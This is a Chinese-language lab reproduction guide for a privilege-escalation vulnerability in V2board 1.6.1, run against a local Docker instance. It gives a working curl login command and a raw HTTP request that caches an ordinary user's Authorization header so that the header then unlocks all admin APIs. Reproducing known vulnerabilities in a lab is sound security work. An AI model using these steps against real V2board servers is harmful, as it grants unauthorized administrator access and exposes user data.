# V2board 1.6.1 提权漏洞

# 漏洞环境

执行如下命令启动一个V2board 1.6.1版本服务器：

```plain
docker compose up -d
```

服务启动后，访问http://localhost:8080即可查看到其登录页面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964905734-e91fd6af-be75-49b0-bfc9-bae19c9c3ac8.png)

## 漏洞复现

复现该漏洞，必须注册或找到一个普通用户账号。注册完成后，我们发送如下请求进行登录（将其中账号密码替换成你注册时使用的信息）：

```plain
curl -i -s -k -XPOST --data-binary "email=example%40example.com&password=a123123123" http://localhost:8080/api/v1/passport/auth/login
```

服务器会返回当前用户的认证信息“auth_data”：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964905826-579c1825-93b8-437e-aaeb-de3bc9693440.png)

拷贝这个认证信息，并替换到如下数据包的Authorization头中，发送：

```plain
GET /api/v1/user/info HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Connection: close
Authorization: ZXhhbXBsZUBleGFtcGxlLmNvbTokMnkkMTAkMVJpUFplR2RnZlFPSVRyWEM4dW0udW5QZVZNTGs3RlFFbkFVVnBwbEhmTlMyczdQaEpTa3E=
Cache-Control: max-age=0
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964906014-7ccf0d04-e717-44e3-a53b-e43be09c9fcf.png)

这一步的目的是让服务器将我们的Authorization头写入缓存中。

最后，只需要带上这个Authorization头，即可使用所有管理员API了。例如http://your-ip:8080/api/v1/admin/user/fetch

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780964906070-fb94490e-f137-43fe-b54b-7517057cc518.png)